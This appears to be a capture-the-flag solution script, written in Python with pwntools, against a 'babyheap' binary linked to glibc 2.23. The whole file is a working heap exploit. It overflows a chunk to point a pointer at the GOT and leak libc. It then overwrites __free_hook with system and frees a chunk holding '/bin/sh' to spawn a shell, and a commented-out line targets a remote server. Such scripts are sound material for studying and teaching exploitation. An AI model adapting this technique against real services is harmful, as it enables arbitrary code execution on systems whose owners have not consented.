#!/usr/bin/python3

from pwn import *
import subprocess
import struct

libc = ELF('./libc6_2.23-0ubuntu11.3_amd64.so', checksec=False)
context.binary = exe = ELF('./babyheap_patched', checksec=False)
context.log_level = 'info'

def create(idx, size, data):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'index: ', f'{idx}'.encode())
    p.sendlineafter(b'Size: ', f'{size}'.encode())
    p.sendafter(b'say?', data)

def free(idx):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'index: ', f'{idx}'.encode())

def read(idx):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'index: ', f'{idx}'.encode())

def write(idx, data):
    p.sendlineafter(b'>> ', b'4')
    p.sendlineafter(b'index: ', f'{idx}'.encode())
    p.sendafter(b'say?', data)

p = process(exe.path)
# p = remote('139.180.134.15', 7330)

##########################
### Stage 1: Leak libc ###
##########################
for i in range(3):
    create(i, 0x40, f'{i}'.encode()*8)
for i in range(3):
    free(i)

input(str(p.pid))
write(1, b'A'*0x48 + p64(0x21) + p64(8) + p64(exe.got['puts']))
read(2)
p.recvline()
puts_addr = u64(p.recvline()[:-1])
log.info("Puts address: " + hex(puts_addr))
libc.address = puts_addr - libc.sym['puts']
log.info("Libc base: " + hex(libc.address))

##############################################################
### Stage 2: Change __free_hook into system & get shell ###
##############################################################
write(1, b'A'*0x48 + p64(0x21) + p64(8) + p64(libc.sym['__free_hook']))
write(2, p64(libc.sym['system']))

create(0, 0x40, b'/bin/sh\x00')
free(0)

p.interactive()